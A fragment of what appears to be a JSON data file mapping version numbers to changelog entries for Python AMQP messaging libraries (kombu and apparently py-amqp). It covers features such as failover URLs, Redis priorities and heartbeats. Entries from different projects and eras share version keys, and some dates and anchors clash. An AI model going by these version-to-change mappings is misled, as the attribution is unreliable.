Uddin\n\n- Implement speedups in cython (311)\n- Updated some tests & code improvements\n- Separate logger for Connection.heartbeat_tick method\n- Cython generic content (315)\n- Improve documentation a_global parameter of basic_qos() method.\n- Fix saving partial read buffer on windows during socket timeout. (321)\n- Fix deserialization of long string field values that are not utf-8.\n- Added simple cythonization of abstract_channel.py\n- Speedups of serialization.py are more restrictive\n\n.. _version-2.5.2:\n\n", "2.5.2": "=====\n:release-date: 2012-11-29 12:35 P.M UTC\n:release-by: Ask Solem\n\n- [Redis] Fixed connection leak and added a new 'max_connections' transport\n  option.\n\n.. _version-2.5.1:\n\n", "2.5.1": "=====\n:release-date: 2012-11-28 12:45 P.M UTC\n:release-by: Ask Solem\n\n- Fixed bug where return value of Queue.as_dict could not be serialized with\n  JSON (Issue 177).\n\n.. _version-2.5.0:\n\n", "2.5.0": "=====\n:release-date: 2012-11-27 04:00 P.M UTC\n:release-by: Ask Solem\n\n- `py-amqp`_ is now the new default transport, replacing ``amqplib``.\n\n    The new `py-amqp`_ library is a fork of amqplib started with the\n    following goals:\n\n        - Uses AMQP 0.9.1 instead of 0.8\n        - Support for heartbeats (Issue 79 + Issue 131)\n        - Automatically revives channels on channel errors.\n        - Support for all RabbitMQ extensions\n            - Consumer Cancel Notifications (Issue 131)\n            - Publisher Confirms (Issue 131).\n            - Exchange-to-exchange bindings: ``exchange_bind`` / ``exchange_unbind``.\n        - API compatible with :mod:`librabbitmq` so that it can be used\n          as a pure-python replacement in environments where rabbitmq-c cannot\n          be compiled.  librabbitmq will be updated to support all the same\n          features as py-amqp.\n\n- Support for using multiple connection URL's for failover.\n\n    The first argument to :class:`~kombu.Connection` can now be a list of\n    connection URLs:\n\n    .. code-block:: python\n\n        Connection(['amqp://foo', 'amqp://bar'])\n\n    or it can be a single string argument with several URLs separated by\n    semicolon:\n\n    .. code-block:: python\n\n        Connection('amqp://foo;amqp://bar')\n\n    There is also a new keyword argument ``failover_strategy`` that defines\n    how :meth:`~kombu.Connection.ensure_connection`/\n    :meth:`~kombu.Connection.ensure`/:meth:`kombu.Connection.autoretry` will\n    reconnect in the event of connection failures.\n\n    The default reconnection strategy is ``round-robin``, which will simply\n    cycle through the list forever, and there's also a ``shuffle`` strategy\n    that will select random hosts from the list.  Custom strategies can also\n    be used, in that case the argument must be a generator yielding the URL\n    to connect to.\n\n    Example:\n\n    .. code-block:: python\n\n        Connection('amqp://foo;amqp://bar')\n\n- Now supports PyDev, PyCharm, pylint and other static code analysis tools.\n\n- :class:`~kombu.Queue` now supports multiple bindings.\n\n    You can now have multiple bindings in the same queue by having\n    the second argument be a list:\n\n    .. code-block:: python\n\n        from kombu import binding, Queue\n\n        Queue('name', [\n            binding(Exchange('E1'), routing_key='foo'),\n            binding(Exchange('E1'), routing_key='bar'),\n            binding(Exchange('E2'), routing_key='baz'),\n        ])\n\n    To enable this, helper methods have been added:\n\n        - :meth:`~kombu.Queue.bind_to`\n        - :meth:`~kombu.Queue.unbind_from`\n\n    Contributed by Rumyana Neykova.\n\n- Custom serializers can now be registered using Setuptools entry-points.\n\n    See :ref:`serialization-entrypoints`.\n\n- New :class:`kombu.common.QoS` class used as a thread-safe way to manage\n  changes to a consumer or channels prefetch_count.\n\n    This was previously an internal class used in Celery now moved to\n    the :mod:`kombu.common` module.\n\n- Consumer now supports a ``on_message`` callback that can be used to process\n  raw messages (not decoded).\n\n    Other callbacks specified using the ``callbacks`` argument, and\n    the ``receive`` method will be not be called when a on message callback\n    is present.\n\n- New utility :func:`kombu.common.ignore_errors` ignores connection and\n  channel errors.\n\n    Must only be used for cleanup actions at shutdown or on connection loss.\n\n- Support for exchange-to-exchange bindings.\n\n    The :class:`~kombu.Exchange` entity gained ``bind_to``\n    and ``unbind_from`` methods:\n\n    .. code-block:: python\n\n        e1 = Exchange('A')(connection)\n        e2 = Exchange('B')(connection)\n\n        e2.bind_to(e1, routing_key='rkey', arguments=None)\n        e2.unbind_from(e1, routing_key='rkey', arguments=None)\n\n    This is currently only supported by the ``pyamqp`` transport.\n\n    Contributed by Rumyana Neykova.\n\n.. _version-2.4.10:\n\n", "2.4.2": "=====\n:release-date: 2012-08-24 05:00 P.M BST\n:release-by: Ask Solem\n\n- Having an empty transport name broke in 2.4.1.\n\n\n.. _version-2.4.1:\n\n", "2.4.1": "=====\n:release-date: 2012-08-24 04:00 P.M BST\n:release-by: Ask Solem\n\n- Redis: Fixed race condition that could cause the consumer to crash (Issue 151)\n\n    Often leading to the error message ``\"could not convert string to float\"``\n\n- Connection retry could cause an inifite loop (Issue 145).\n\n- The ``amqp`` alias is now resolved at runtime, so that eventlet detection\n  works even if patching was done later.\n\n.. _version-2.4.0:\n\n", "2.4.0": "=====\n:release-date: 2012-08-17 08:00 P.M BST\n:release-by: Ask Solem\n\n- New experimental :mod:`ZeroMQ <kombu.transport.zmq` transport.\n\n    Contributed by John Watson.\n\n- Redis: Ack timed-out messages were not restored when using the eventloop.\n\n- Now uses pickle protocol 2 by default to be cross-compatible with Python 3.\n\n    The protocol can also now be changed using the :envvar:`PICKLE_PROTOCOL`\n    environment variable.\n\n- Adds ``Transport.supports_ev`` attribute.\n\n- Pika: Queue purge was not working properly.\n\n    Fix contributed by Steeve Morin.\n\n- Pika backend was no longer working since Kombu 2.3\n\n    Fix contributed by Steeve Morin.\n\n.. _version-2.3.2:\n\n", "2.3.2": "=====\n:release-date: 2012-08-01 06:00 P.M BST\n:release-by: Ask Solem\n\n- Fixes problem with deserialization in Python 3.\n\n.. _version-2.3.1:\n\n", "2.3.1": "=====\n:release-date: 2012-08-01 04:00 P.M BST\n:release-by: Ask Solem\n\n- librabbitmq: Can now handle messages that does not have a\n  content_encoding/content_type set (Issue 149).\n\n    Fix contributed by C Anthony Risinger.\n\n- Beanstalk: Now uses localhost by default if the URL does not contain a host.\n\n.. _version-2.3.0:\n\n", "2.3.0": "=====\n:release-date: 2012-07-24 03:50 P.M BST\n:release-by: Ask Solem\n\n- New ``pyamqp://`` transport!\n\n    The new `py-amqp`_ library is a fork of amqplib started with the\n    following goals:\n\n        - Uses AMQP 0.9.1 instead of 0.8\n        - Should support all RabbitMQ extensions\n        - API compatible with :mod:`librabbitmq` so that it can be used\n          as a pure-python replacement in environments where rabbitmq-c cannot\n          be compiled.\n\n    .. _`py-amqp`: https://amqp.readthedocs.io/\n\n    If you start using use py-amqp instead of amqplib you can enjoy many\n    advantages including:\n\n        - Heartbeat support (Issue 79 + Issue 131)\n        - Consumer Cancel Notifications (Issue 131)\n        - Publisher Confirms\n\n    amqplib has not been updated in a long while, so maintaining our own fork\n    ensures that we can quickly roll out new features and fixes without\n    resorting to monkey patching.\n\n    To use the py-amqp transport you must install the :mod:`amqp` library:\n\n    .. code-block:: console\n\n        $ pip install amqp\n\n    and change the connection URL to use the correct transport:\n\n    .. code-block:: pycon\n\n        >>> conn = Connection('pyamqp://guest:guestlocalhost//')\n\n\n    The ``pyamqp://`` transport will be the default fallback transport\n    in Kombu version 3.0, when :mod:`librabbitmq` is not installed,\n    and librabbitmq will also be updated to support the same features.\n\n- Connection now supports heartbeat argument.\n\n    If enabled you must make sure to manually maintain heartbeats\n    by calling the ``Connection.heartbeat_check`` at twice the rate\n    of the specified heartbeat interval.\n\n    E.g. if you have ``Connection(heartbeat=10)``,\n    then you must call ``Connection.heartbeat_check()`` every 5 seconds.\n\n    if the server has not sent heartbeats at a suitable rate then\n    the heartbeat check method must raise an error that is listed\n    in ``Connection.connection_errors``.\n\n    The attribute ``Connection.supports_heartbeats`` has been added\n    for the ability to inspect if a transport supports heartbeats\n    or not.\n\n    Calling ``heartbeat_check`` on a transport that does\n    not support heartbeats results in a noop operation.\n\n- SQS: Fixed bug with invalid characters in queue names.\n\n    Fix contributed by Zach Smith.\n\n- utils.reprcall: Fixed typo where kwargs argument was an empty tuple by\n  default, and not an empty dict.\n\n.. _version-2.2.6:\n\n", "2.2.2": "=====\n:release-date: 2012-06-22 02:30 P.M BST\n:release-by: Ask Solem\n\n- Now depends on :mod:`anyjson` 0.3.3\n\n- Json serializer: Now passes :class:`buffer` objects directly,\n  since this is supported in the latest :mod:`anyjson` version.\n\n- Fixes blocking epoll call if timeout was set to 0.\n\n    Fix contributed by John Watson.\n\n- setup.py now takes requirements from the :file:`requirements/` directory.\n\n- The distribution directory :file:`contrib/` is now renamed to :file:`extra/`\n\n.. _version-2.2.1:\n\n", "2.2.1": "=====\n:release-date: 2012-06-21 01:00 P.M BST\n:release-by: Ask Solem\n\n- SQS: Default visibility timeout is now 30 minutes.\n\n    Since we have ack emulation the visibility timeout is\n    only in effect if the consumer is abrubtly terminated.\n\n- retry argument to ``Producer.publish`` now works properly,\n  when the declare argument is specified.\n\n- Json serializer: didn't handle buffer objects (Issue 135).\n\n    Fix contributed by Jens Hoffrichter.\n\n- Virtual: Now supports passive argument to ``exchange_declare``.\n\n- Exchange & Queue can now be bound to connections (which will use the default\n  channel):\n\n    .. code-block:: pycon\n\n        >>> exchange = Exchange('name')\n        >>> bound_exchange = exchange(connection)\n        >>> bound_exchange.declare()\n\n- ``SimpleQueue`` & ``SimpleBuffer`` can now be bound to connections (which\n  will use the default channel).\n\n- ``Connection.manager.get_bindings`` now works for librabbitmq and pika.\n\n- Adds new transport info attributes:\n\n    - ``Transport.driver_type``\n\n        Type of underlying driver, e.g. \"amqp\", \"redis\", \"sql\".\n\n    - ``Transport.driver_name``\n\n        Name of library used e.g. \"amqplib\", \"redis\", \"pymongo\".\n\n    - ``Transport.driver_version()``\n\n        Version of underlying library.\n\n.. _version-2.2.0:\n\n", "2.2.0": "=====\n:release-date: 2012-06-07 03:10 P.M BST\n:release-by: Ask Solem\n\n.. _v220-important:\n\nImportant Notes\n---------------\n\n- The canonical source code repository has been moved to\n\n    http://github.com/celery/kombu\n\n- Pidbox: Exchanges used by pidbox are no longer auto_delete.\n\n    Auto delete has been described as a misfeature,\n    and therefore we have disabled it.\n\n    For RabbitMQ users old exchanges used by pidbox must be removed,\n    these are named ``mailbox_name.pidbox``,\n    and ``reply.mailbox_name.pidbox``.\n\n    The following command can be used to clean up these exchanges:\n\n    .. code-block:: text\n\n        $ VHOST=/ URL=amqp:// python -c'import sys,kombu;[kombu.Connection(\n            sys.argv[-1]).channel().exchange_delete(x)\n                for x in sys.argv[1:-1]]' \\\n            $(sudo rabbitmqctl -q list_exchanges -p \"$VHOST\" \\\n            | grep \\.pidbox | awk '{print $1}') \"$URL\"\n\n    The :envvar:`VHOST` variable must be set to the target RabbitMQ virtual host,\n    and the :envvar:`URL` must be the AMQP URL to the server.\n\n- The ``amqp`` transport alias will now use :mod:`librabbitmq`\n  if installed.\n\n    `py-librabbitmq`_ is a fast AMQP client for Python\n    using the librabbitmq C library.\n\n    It can be installed by:\n\n    .. code-block:: console\n\n        $ pip install librabbitmq\n\n    It will not be used if the process is monkey patched by eventlet/gevent.\n\n.. _`py-librabbitmq`: https://github.com/celery/librabbitmq\n\n.. _v220-news:\n\nNews\n----\n\n- Redis: Ack emulation improvements.\n\n    Reducing the possibility of data loss.\n\n    Acks are now implemented by storing a copy of the message when the message\n    is consumed.  The copy is not removed until the consumer acknowledges\n    or rejects it.\n\n    This means that unacknowledged messages will be redelivered either\n    when the connection is closed, or when the visibility timeout is exceeded.\n\n    - Visibility timeout\n\n        This is a timeout for acks, so that if the consumer\n        does not ack the message within this time limit, the message\n        is redelivered to another consumer.\n\n        The timeout is set to one hour by default, but\n        can be changed by configuring a transport option:\n\n            >>> Connection('redis://', transport_options={\n            ...     'visibility_timeout': 1800,   30 minutes\n            ... })\n\n    **NOTE**: Messages that have not been acked will be redelivered\n    if the visibility timeout is exceeded, for Celery users\n    this means that ETA/countdown tasks that are scheduled to execute\n    with a time that exceeds the visibility timeout will be executed\n    twice (or more).  If you plan on using long ETA/countdowns you\n    should tweak the visibility timeout accordingly:\n\n    .. code-block:: python\n\n        BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 18000}   5 hours\n\n    Setting a long timeout means that it will take a long time\n    for messages to be redelivered in the event of a power failure,\n    but if so happens you could temporarily set the visibility timeout lower\n    to flush out messages when you start up the systems again.\n\n- Experimental `Apache ZooKeeper`_ transport\n\n    More information is in the module reference:\n    :mod:`kombu.transport.zookeeper`.\n\n    Contributed by Mahendra M.\n\n.. _`Apache ZooKeeper`: http://zookeeper.apache.org/\n\n- Redis: Priority support.\n\n    The message's ``priority`` field is now respected by the Redis\n    transport by having multiple lists for each named queue.\n    The queues are then consumed by in order of priority.\n\n    The priority field is a number in the range of 0 - 9, where\n    0 is the default and highest priority.\n\n    The priority range is collapsed into four steps by default, since it is\n    unlikely that nine steps will yield more benefit than using four steps.\n    The number of steps can be configured by setting the ``priority_steps``\n    transport option, which must be a list of numbers in **sorted order**:\n\n    .. code-block:: pycon\n\n        >>> x = Connection('redis://', transport_options={\n        ...     'priority_steps': [0, 2, 4, 6, 8, 9],\n        ... })\n\n    Priorities implemented in this way is not as reliable as\n    priorities on the server side, which is why\n    nickname the feature \"quasi-priorities\";\n    **Using routing is still the suggested way of ensuring\n    quality of service**, as client implemented priorities\n    fall short in a number of ways, e.g. if the worker\n    is busy with long running tasks, has prefetched many messages,\n    or the queues are congested.\n\n    Still, it is possible that using priorities in combination\n    with routing can be more beneficial than using routing\n    or priorities alone.  Experimentation and monitoring\n    should be used to prove this.\n\n    Contributed by Germ\u00e1n M. Bravo.\n\n- Redis: Now cycles queues so that consuming is fair.\n\n    This ensures that a very busy queue won't block messages\n    from other queues, and ensures that all queues have\n    an equal chance of being consumed from.\n\n    This used to be the case before, but the behavior was\n    accidentally changed while switching to using blocking pop.\n\n- Redis: Auto delete queues that are bound to fanout exchanges\n  is now deleted at channel.close.\n\n- amqplib: Refactored the drain_events implementation.\n\n- Pidbox: Now uses ``connection.default_channel``.\n\n- Pickle serialization: Can now decode buffer objects.\n\n- Exchange/Queue declarations can now be cached even if\n  the entity is non-durable.\n\n    This is possible because the list of cached declarations\n    are now kept with the connection, so that the entities\n    will be redeclared if the connection is lost.\n\n- Kombu source code now only uses one-level of explicit relative imports.\n\n.. _v220-fixes:\n\nFixes\n-----\n\n- eventio: Now ignores ENOENT raised by ``epoll.register``, and\n  EEXIST from ``epoll.unregister``.\n\n- eventio: kqueue now ignores :exc:`KeyError` on unregister.\n\n- Redis: ``Message.reject`` now supports the ``requeue`` argument.\n\n- Redis: Remove superfluous pipeline call.\n\n    Fix contributed by Thomas Johansson.\n\n- Redis: Now sets redelivered header for redelivered messages.\n\n- Now always makes sure references to :func:`sys.exc_info` is removed.\n\n- Virtual: The compression header is now removed before restoring messages.\n\n- More tests for the SQLAlchemy backend.\n\n    Contributed by Franck Cuny.\n\n- Url parsing did not handle MongoDB URLs properly.\n\n    Fix contributed by Flavio Percoco Premoli.\n\n- Beanstalk: Ignore default tube when reserving.\n\n    Fix contributed by Zhao Xiaohong.\n\nNonblocking consume support\n---------------------------\n\nlibrabbitmq, amqplib and redis transports can now be used\nnon-blocking.\n\nThe interface is very manual, and only consuming messages\nis non-blocking so far.\n\nThe API should not be regarded as stable or final\nin any way. It is used by Celery which has very limited\nneeds at this point. Hopefully we can introduce a proper\ncallback-based API later.\n\n- ``Transport.eventmap``\n\n    Is a map of ``fd -> callback(fileno, event)``\n    to register in an eventloop.\n\n- ``Transport.on_poll_start()``\n\n    Is called before every call to poll.\n    The poller must support ``register(fd, callback)``\n    and ``unregister(fd)`` methods.\n\n- ``Transport.on_poll_start(poller)``\n\n    Called when the hub is initialized.\n    The poller argument must support the same\n    interface as :class:`kombu.utils.eventio.poll`.\n\n- ``Connection.ensure_connection`` now takes a callback\n  argument which is called for every loop while\n  the connection is down.\n\n- Adds ``connection.drain_nowait``\n\n    This is a non-blocking alternative to drain_events,\n    but only supported by amqplib/librabbitmq.\n\n- drain_events now sets ``connection.more_to_read`` if\n  there is more data to read.\n\n    This is to support eventloops where other things\n    must be handled between draining events.\n\n.. _version-2.1.8:\n\n", "2.1.4": "=====\n:release-date: 2012-04-03 04:00 P.M GMT\n:release-by: Ask Solem\n\n* MongoDB:  URL parsing are now delegated to the pymongo library\n  (Fixes Issue 103 and Issue 87).\n\n    Fix contributed by Flavio Percoco Premoli and James Sullivan\n\n* SQS:  A bug caused SimpleDB to be used even if sdb persistence\n  was not enabled (Issue 108).\n\n    Fix contributed by Anand Kumria.\n\n* Django:  Transaction was committed in the wrong place, causing\n  data cleanup to fail (Issue 115).\n\n    Fix contributed by Daisuke Fujiwara.\n\n* MongoDB: Now supports replica set URLs.\n\n    Contributed by Flavio Percoco Premoli.\n\n* Redis: Now raises a channel error if a queue key that is currently\n  being consumed from disappears.\n\n    Fix contributed by Stephan Jaekel.\n\n* All transport 'channel_errors' lists now includes\n  ``kombu.exception.StdChannelError``.\n\n* All kombu exceptions now inherit from a common\n  :exc:`~kombu.exceptions.KombuError`.\n\n.. _version-2.1.3:\n\n", "2.1.3": "=====\n:release-date: 2012-03-20 03:00 P.M GMT\n:release-by: Ask Solem\n\n* Fixes Jython compatibility issues.\n\n* Fixes Python 2.5 compatibility issues.\n\n.. _version-2.1.2:\n\n", "2.1.2": "=====\n:release-date: 2012-03-01 01:00 P.M GMT\n:release-by: Ask Solem\n\n* amqplib: Last version broke SSL support.\n\n.. _version-2.1.1:\n\n", "2.1.1": "=====\n:release-date: 2012-02-24 02:00 P.M GMT\n:release-by: Ask Solem\n\n* Connection URLs now supports encoded characters.\n\n* Fixed a case where connection pool could not recover from connection loss.\n\n    Fix contributed by Florian Munz.\n\n* We now patch amqplib's ``__del__`` method to skip trying to close the socket\n  if it is not connected, as this resulted in an annoying warning.\n\n* Compression can now be used with binary message payloads.\n\n    Fix contributed by Steeve Morin.\n\n.. _version-2.1.0:\n\n", "2.1.0": "=====\n:release-date: 2012-02-04 10:38 P.M GMT\n:release-by: Ask Solem\n\n* MongoDB: Now supports fanout (broadcast) (Issue 98).\n\n    Contributed by Scott Lyons.\n\n* amqplib: Now detects broken connections by using ``MSG_PEEK``.\n\n* pylibrabbitmq: Now supports ``basic_get`` (Issue 97).\n\n* gevent: Now always uses the ``select`` polling backend.\n\n* pika transport: Now works with pika 0.9.5 and 0.9.6dev.\n\n    The old pika transport (supporting 0.5.x) is now available\n    as alias ``oldpika``.\n\n    (Note terribly latency has been experienced with the new pika\n    versions, so this is still an experimental transport).\n\n* Virtual transports: can now set polling interval via the\n  transport options (Issue 96).\n\n    Example:\n\n    .. code-block:: pycon\n\n        >>> Connection('sqs://', transport_options={\n        ...     'polling_interval': 5.0})\n\n    The default interval is transport specific, but usually\n    1.0s (or 5.0s for the Django database transport, which\n    can also be set using the ``KOMBU_POLLING_INTERVAL`` setting).\n\n* Adds convenience function: :func:`kombu.common.eventloop`.\n\n.. _version-2.0.0:\n\n", "2.0.3": "=====\n:release-date: 2016-07-11 08:00 P.M PDT\n:release-by: Ask Solem\n\n- SSLTransport: Fixed crash \"no attribute sslopts\" when ``ssl=True``\n  (Issue 100).\n\n- Fixed incompatible argument spec for ``Connection.Close`` (Issue 45).\n\n    This caused the RabbitMQ server to raise an exception (INTERNAL ERROR).\n\n- Transport: No longer implements `__del__` to make sure gc can collect\n  connections.\n\n    It's the responsibility of the caller to close connections, this was\n    simply a relic from the amqplib library.\n\n.. _version-2.0.2:\n\n", "2.0.2": "=====\n:release-date: 2016-06-10 5:40 P.M PDT\n:release-by: Ask Solem\n\n- Python 3: Installation requirements ended up being a generator\n  and crashed setup.py.\n\n    Fix contributed by ChangBo Guo(gcb).\n\n- Python <= 2.7.7: struct.pack arguments cannot be unicode\n\n    Fix contributed by Alan Justino and Xin Li.\n\n- Python 3.4: Fixed use of `bytes % int`.\n\n    Fix contributed by Alan Justino.\n\n- Connection/Transport: Fixed handling of default port.\n\n    Fix contributed by Quentin Pradet.\n\n.. _version-2.0.1:\n\n", "2.0.1": "=====\n:release-date: 2016-05-31 6:20 P.M PDT\n:release-by: Ask Solem\n\n- Adds backward compatibility layer for the 1.4 API.\n\n    Using the connection without calling ``.connect()`` first will now work,\n    but a warning is emitted and the behavior is deprecated and will be\n    removed in version 2.2.\n\n- Fixes kombu 3.0/celery 3.1 compatibility (Issue 88).\n\n    Fix contributed by Bas ten Berge.\n\n- Fixed compatibility with Python 2.7.3 (Issue 85)\n\n    Fix contributed by Bas ten Berge.\n\n- Fixed bug where calling drain_events() with a timeout of 0 would actually\n  block until a frame is received.\n\n- Documentation moved to http://amqp.readthedocs.io (Issue #89).\n\n    See https://blog.readthedocs.com/securing-subdomains/ for the reasoning\n    behind this change.\n\n    Fix contributed by Adam Chainz.\n\n.. _version-2.0.0:\n\n", "2.0.0": "=====\n:release-date: 2012-01-15 06:34 P.M GMT\n:release-by: Ask Solem\n\n.. _v200-important:\n\nImportant Notes\n---------------\n\n.. _v200-python-compatibility:\n\nPython Compatibility\n~~~~~~~~~~~~~~~~~~~~\n\n* No longer supports Python 2.4.\n\n    Users of Python 2.4 can still use the 1.x series.\n\n    The 1.x series has entered bugfix-only maintenance mode, and will\n    stay that way as long as there is demand, and a willingness to\n    maintain it.\n\n\n.. _v200-new-transports:\n\nNew Transports\n~~~~~~~~~~~~~~\n\n* ``django-kombu`` is now part of Kombu core.\n\n    The Django message transport uses the Django ORM to store messages.\n\n    It uses polling, with a default polling interval of 5 seconds.\n    The polling interval can be increased or decreased by configuring the\n    ``KOMBU_POLLING_INTERVAL`` Django setting, which is the polling\n    interval in seconds as an int or a float.  Note that shorter polling\n    intervals can cause extreme strain on the database: if responsiveness\n    is needed you shall consider switching to a non-polling transport.\n\n    To use it you must use transport alias ``\"django\"``,\n    or as a URL:\n\n    .. code-block:: text\n\n        django://\n\n    and then add ``kombu.transport.django`` to ``INSTALLED_APPS``, and\n    run ``manage.py syncdb`` to create the necessary database tables.\n\n    **Upgrading**\n\n    If you have previously used ``django-kombu``, then the entry\n    in ``INSTALLED_APPS`` must be changed from ``djkombu``\n    to ``kombu.transport.django``:\n\n    .. code-block:: python\n\n        INSTALLED_APPS = (\n             \u2026,\n            'kombu.transport.django',\n        )\n\n    If you have previously used django-kombu, then there is no need\n    to recreate the tables, as the old tables will be fully compatible\n    with the new version.\n\n* ``kombu-sqlalchemy`` is now part of Kombu core.\n\n    This change requires no code changes given that the\n    ``sqlalchemy`` transport alias is used.\n\n.. _v200-news:\n\nNews\n----\n\n* :class:`kombu.mixins.ConsumerMixin` is a mixin class that lets you\n  easily write consumer programs and threads.\n\n  See :ref:`examples` and :ref:`guide-consumers`.\n\n* SQS Transport: Added support for SQS queue prefixes (Issue 84).\n\n    The queue prefix can be set using the transport option\n    ``queue_name_prefix``:\n\n    .. code-block:: python\n\n        BrokerTransport('SQS://', transport_options={\n            'queue_name_prefix': 'myapp'})\n\n    Contributed by Nitzan Miron.\n\n* ``Producer.publish`` now supports automatic retry.\n\n    Retry is enabled by the ``reply`` argument, and retry options\n    set by the ``retry_policy`` argument:\n\n    .. code-block:: python\n\n        exchange = Exchange('foo')\n        producer.publish(message, exchange=exchange, retry=True,\n                         declare=[exchange], retry_policy={\n                            'interval_start': 1.0})\n\n    See :meth:`~kombu.Connection.ensure`\n    for a list of supported retry policy options.\n\n* ``Producer.publish`` now supports a ``declare`` keyword argument.\n\n    This is a list of entities (:class:`Exchange`, or :class:`Queue`)\n    that should be declared before the message is published.\n\n.. _v200-fixes:\n\nFixes\n-----\n\n* Redis transport: Timeout was multiplied by 1000 seconds when using\n  ``select`` for event I/O (Issue 86).\n\n.. _version-1.5.1:\n\n", "1.4.9": "=====\n:release-date: 2016-01-08 5:50 P.M PST\n:release-by: Ask Solem\n\n- Fixes compatibility with Linux/macOS instances where the ``ctypes`` module\n  does not exist.\n\n    Fix contributed by Jared Lewis.\n\n.. _version-1.4.8:\n\n", "1.4.8": "=====\n:release-date: 2015-12-07 12:25 A.M\n:release-by: Ask Solem\n\n- ``abstract_channel.wait`` now accepts a float `timeout` parameter expressed\n    in seconds\n\n    Contributed by Goir.\n\n.. _version-1.4.7:\n\n", "1.4.7": "=====\n:release-date: 2015-10-02 05:30 P.M PDT\n:release-by: Ask Solem\n\n- Fixed libSystem error on macOS 10.11 (El Capitan)\n\n    Fix contributed by Eric Wang.\n\n- ``channel.basic_publish`` now raises :exc:`amqp.exceptions.NotConfirmed` on\n    ``basic.nack``.\n\n- AMQP timestamps received are now converted from GMT instead of local time\n    (Issue 67).\n\n- Wheel package installation now supported by both Python 2 and Python3.\n\n    Fix contributed by R\u00e9my Greinhofer.\n\n.. _version-1.4.6:\n\n", "1.4.6": "=====\n:release-date: 2014-08-11 06:00 P.M UTC\n:release-by: Ask Solem\n\n- Now keeps buffer when socket times out.\n\n    Fix contributed by Artyom Koval.\n\n- Adds ``Connection.Transport`` attribute that can be used to specify\n  a different transport implementation.\n\n    Contributed by Yury Selivanov.\n\n.. _version-1.4.5:\n\n", "1.4.5": "=====\n:release-date: 2014-04-15 09:00 P.M UTC\n:release-by: Ask Solem\n\n- Can now deserialize more AMQP types.\n\n    Now handles types ``short string``, ``short short int``,\n    ``short short unsigned int``, ``short int``,  ``short unsigned int``,\n    ``long unsigned int``,  ``long long int``, ``long long unsigned int``\n    and ``float`` which for some reason was missing, even in the original\n    amqplib module.\n\n- SSL: Workaround for Python SSL bug.\n\n    A bug in the python socket library causes ``ssl.read/write()``\n    on a closed socket to raise :exc:`AttributeError` instead of\n    :exc:`IOError`.\n\n    Fix contributed by Craig Jellick.\n\n- ``Transport.__del_`` now handles errors occurring at late interpreter\n  shutdown (Issue 36).\n\n.. _version-1.4.4:\n\n", "1.4.4": "=====\n:release-date: 2014-03-03 04:00 P.M UTC\n:release-by: Ask Solem\n\n- SSL transport accidentally disconnected after read timeout.\n\n    Fix contributed by Craig Jellick.\n\n.. _version-1.4.3:\n\n", "1.4.3": "=====\n:release-date: 2011-10-27 10:00 P.M BST\n:release-by: Ask Solem\n\n* Fixes bug in ProducerPool where too many resources would be acquired.\n\n.. _version-1.4.2:\n\n", "1.4.2": "=====\n:release-date: 2011-10-26 05:00 P.M BST\n:release-by: Ask Solem\n\n* Eventio: Polling should ignore `errno.EINTR`\n\n* SQS: str.encode did only start accepting kwargs after Py2.7.\n\n* simple_task_queue example didn't run correctly (Issue 72).\n\n    Fix contributed by Stefan Eletzhofer.\n\n* Empty messages would not raise an exception not able to be handled\n  by `on_decode_error` (Issue 72)\n\n    Fix contributed by Christophe Chauvet.\n\n* CouchDB: Properly authenticate if user/password set (Issue 70)\n\n    Fix contributed by Rafael Duran Castaneda\n\n* Connection.Consumer had the wrong signature.\n\n    Fix contributed by Pavel Skvazh\n\n.. _version-1.4.1:\n\n", "1.4.1": "=====\n:release-date: 2011-09-26 04:00 P.M BST\n:release-by: Ask Solem\n\n* 1.4.0 broke the producer pool, resulting in new connections being\n  established for every acquire.\n\n\n.. _version-1.4.0:\n\n", "1.4.0": "=====\n:release-date: 2011-09-22 05:00 P.M BST\n:release-by: Ask Solem\n\n* Adds module :mod:`kombu.mixins`.\n\n    This module contains a :class:`~kombu.mixins.ConsumerMixin` class\n    that can be used to easily implement a message consumer\n    thread that consumes messages from one or more\n    :class:`kombu.Consumer` instances.\n\n* New example: :ref:`task-queue-example`\n\n    Using the ``ConsumerMixin``, default channels and\n    the global connection pool to demonstrate new Kombu features.\n\n* MongoDB transport did not work with MongoDB >= 2.0 (Issue 66)\n\n    Fix contributed by James Turk.\n\n* Redis-py version check did not account for beta identifiers\n  in version string.\n\n    Fix contributed by David Ziegler.\n\n* Producer and Consumer now accepts a connection instance as the\n  first argument.\n\n    The connections default channel will then be used.\n\n    In addition shortcut methods has been added to Connection:\n\n    .. code-block:: pycon\n\n        >>> connection.Producer(exchange)\n        >>> connection.Consumer(queues=..., callbacks=...)\n\n* Connection has aquired a ``connected`` attribute that\n  can be used to check if the connection instance has established\n  a connection.\n\n* ``ConnectionPool.acquire_channel`` now returns the connections\n  default channel rather than establising a new channel that\n  must be manually handled.\n\n* Added ``kombu.common.maybe_declare``\n\n    ``maybe_declare(entity)`` declares an entity if it has\n    not previously been declared in the same process.\n\n* :func:`kombu.compat.entry_to_queue` has been moved to :mod:`kombu.common`\n\n* New module :mod:`kombu.clocks` now contains an implementation\n  of Lamports logical clock.\n\n.. _version-1.3.5:\n\n", "1.3.3": "=====\n:release-date: 2011-09-15 02:00 P.M BST\n:release-by: Ask Solem\n\n* pools.reset did not support after forker arguments.\n\n.. _version-1.3.2:\n\n", "1.3.2": "=====\n:release-date: 2011-09-10 01:00 P.M BST\n:release-by: Mher Movsisyan\n\n* Broke Python 2.5 compatibility by importing ``parse_qsl`` from ``urlparse``\n\n* Connection.default_channel is now closed when connection is revived\n  after connection failures.\n\n* Pika: Channel now supports the ``connection.client`` attribute\n  as required by the simple interface.\n\n* pools.set_limit now raises an exception if the limit is lower\n  than the previous limit.\n\n* pools.set_limit no longer resets the pools.\n\n.. _version-1.3.1:\n\n", "1.3.1": "=====\n:release-date: 2011-10-07 03:00 P.M BST\n:release-by: Ask Solem\n\n* Last release broke after fork for pool reinitialization.\n\n* Producer/Consumer now has a ``connection`` attribute,\n  giving access to the :class:`Connection` of the\n  instance.\n\n* Pika: Channels now have access to the underlying\n  :class:`Connection` instance using ``channel.connection.client``.\n\n    This was previously required by the ``Simple`` classes and is now\n    also required by :class:`Consumer` and :class:`Producer`.\n\n* Connection.default_channel is now closed at object revival.\n\n* Adds kombu.clocks.LamportClock.\n\n* compat.entry_to_queue has been moved to new module :mod:`kombu.common`.\n\n.. _version-1.3.0:\n\n", "1.3.0": "=====\n:release-date: 2019-03-19 11:00 A.M UTC+2\n:release-by: Omer Katz\n\n- Added the option to ignore the result of a function and simply\n  call the callback without arguments.\n\n  Contributed by **Omer Katz**\n\n.. _version-1.2.0:\n\n", 